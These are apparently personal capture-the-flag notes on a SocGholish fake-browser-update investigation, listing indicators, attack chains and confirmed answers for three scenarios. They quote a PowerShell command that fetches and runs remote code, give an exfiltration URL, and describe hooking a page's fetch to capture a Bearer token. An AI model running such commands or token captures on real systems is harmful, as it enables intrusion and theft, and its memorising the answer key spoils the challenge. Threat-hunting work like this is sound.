---
title: "Deceptive Click (Cymbal / Google SecOps investigation)"
description: "Artifacts Zip contains only FAKEUPDATES Malware Profile.pdf (GTI report 24-10021933). No logs, no SecOps access locally."
published: "2026-11-08"
updated: "2026-11-08"
event: "htb-cymbal"
category: "Cryptography"
kind: "field-note"
status: "reference"
tags: ["Cryptography", "htb-cymbal", "Field notes", "oauth"]
readingTime: 2
wordCount: 426
featured: false
sourcePath: "~/ctf/htb-cymbal/1/notes.md"
---

# Deceptive Click (Cymbal / Google SecOps investigation)

## Artifacts
- Zip contains only `FAKEUPDATES Malware Profile.pdf` (GTI report 24-10021933). No logs, no SecOps access locally.

## Intel from the PDF (pivots to use in SecOps)
- Family: FAKEUPDATES (SocGholish), a JS dropper sent out as a fake browser update.
- Stage 1: script injected into a compromised site, guardrail (webdriver, window size, mousemove) -> event[.]coachgreb[.]com
- Stage 2: `Update.js` (sometimes zipped) lands in Downloads and runs via wscript.
  - Second stage MD5 5d9bcb91fab00d4c0fd8eda8c2756fb6, first stage 80975a1a0ee618ef1a19c2ffa9174868
- C2: POST https://sdce[.]distributors[.]commdistinc[.]com/editContent, MSIE 7.0 UA, header Upgrade-Insecure-Requests: 1
  - beacon body `JOS7WjuI6CV9myHLH1BC1Qy49ueqiMO+kAyhOUkzqA==`, survey `0=b&1=504&...`, result `0=c&1=504&...`
- Follow-on: `powershell -w h -c "iwr -usebasicparsing http://pbvzje4[.]top/f21.svg |iex"`; temp name `%TEMP%\d27e15eb.ps1`
- Later payloads: VOLTMARKER, COLORFAKE, NETSUPPORT -> MYTHIC, VOLTRIGGER

## ANSWERS (confirmed in SecOps tenant ctf-us-15, events from 2026-10-15)
1. CYM-DEN-W10-042.cymbal.corp (user marcus.vance, 10.240.32.115)
2. marketingtrends-insider.com: Zscaler referrer for ChromeSetup_v124.zip from static.cdn-updater-distribution.net, 19:41:59Z
3. 624: Sysmon EID 8, d27e15eb.exe -> svchost.exe TargetPID 624, 20:03:45Z
4. MSSQLSvc/CYM-DB-01.cymbal.corp:1433: EID 4769, RC4 0x17, by marcus.vance, 20:35:37Z
5. svc_backup: EID 4624 from CYM-DEN-W10-042 20:48:45Z, then WinRM to CYM-FS-01
6. Financial_Audit_2026.zip: Compress-Archive of C:\Shares\Finance_Shares\Q3_Audits\ to C:\Windows\Temp\, 21:02Z
Decoy: sarah.jenkins nightly_backup.ps1 on FS-01 at 21:45Z is routine admin activity.

Chain: compromised blog (injected jquery.min.js) -> ChromeSetup_v124.zip -> ChromeSetup.js (wscript) -> C2 sdce.distributors.commdistinc.com
-> PowerShell iwr d27e15eb.png -> d27e15eb.exe -> injection into svchost 624 -> net group / nltest recon -> Kerberoast -> svc_backup -> FS-01 staging.

## OAuth Heist (scenario 2, same tenant) ANSWERS
1. sso-cymbal-portal.com: elena.rostova POST /api/v1/auth/token, 149.50.97.174, 19:16:40Z
2. Okta: A new MFA factor was added: Gmail event via the attacker's proxy IP 23.234.119.110, after the OAuth app "ToogleBox Recall" was authorized at 19:35; log id ...295 comes before the macOS-device alert ...296
3. Cymbal_Q3_Database_Architecture_and_Service_Accounts.pdf: Drive item_download 20:06:15Z from 23.234.119.110
4. svc_dbadmin: EID 4624 from CYM-DATA-WS-007 (10.240.12.65) 20:29:50Z, then WinRM to CYM-DB-01
5. cymbal_cust_q3.bak: sqlcmd BACKUP DATABASE CymbalWealthMaster, then zstd -> cymbal_q3_exfil.tar.zst
6. http://142.11.200.188:8888/upload/cymbal_q3_exfil.tar.zst (POST 21:32:45Z)
Decoy: sarah.jenkins WinRM to DB-01 and sql_health_check.ps1.

## Rogue Synthesis (scenario 3) ANSWERS
1. alex.chen: generativelanguage.googleapis.com gemini-1.5-flash generateContent POST 20:06:20Z (CYM-DEV-WS-019, 10.240.12.80)
2. SyntaxOptimizer-2.1.4.vsix: from the typosquat marketplace.visualstudio.com.cdn-cache.net, 20:00:50Z
3. sys_worker.exe: gcc compiled the Gemini-written %TEMP%\cache_worker.c, 20:07:50Z
4. credentials.db: svchost (hollowed) -> cmd "type C:\Users\alex.chen\.gcloud\credentials.db", 20:28:45Z
5. dev-metrics-cdn.com: POST /api/v2/telemetry, 20:36:15Z
6. build_production.ps1: svc_cicd_deploy WinRM to CYM-CI-RUNNER-01, wrote C:\BuildRunner\scripts\build_production.ps1, 21:45:35Z
Decoy: sarah.jenkins backed up build_production.ps1 at 21:05.

## Access method
Claim at https://goo.gle/coldroom-secops (code CIPHER-3154) -> Okta -> https://ctf-us-15.backstory.chronicle.security
API trick: hook the page's fetch to capture its Bearer token, then call legacy:legacyFetchUdmSearchView + operations/<id>:streamSearch (time range must be <= ~90 days).

## Questions (all need SecOps telemetry, not in the PDF)
1. Denver host FQDN. Hunt: process cmdline `iwr` + `iex`, parent wscript.exe
2. Compromised blog that referred the Update zip. Hunt: proxy logs, http.referral_url near the download
3. svchost.exe PID injected by d27e15eb.exe. Hunt: Sysmon EID 8/10, TargetProcessId
4. Kerberoasted SPN on CYM-DC-01. Hunt: EID 4769, RC4 (0x17) ticket encryption
5. Cracked service account used for lateral movement. Hunt: EID 4624 type 3/10 from the infected host
6. Staging zip on the file server. Hunt: file creation *.zip, EID 5145

Checked: the chrome-devtools browser had only about:blank open (no SecOps session).

## Next step
- Needs the live Google SecOps tenant and the challenge questions. Expected chain in UDM:
  PowerShell alert -> parent wscript.exe running Update.js -> browser download -> referring compromised site -> C2 domains -> follow-on payload and objective.
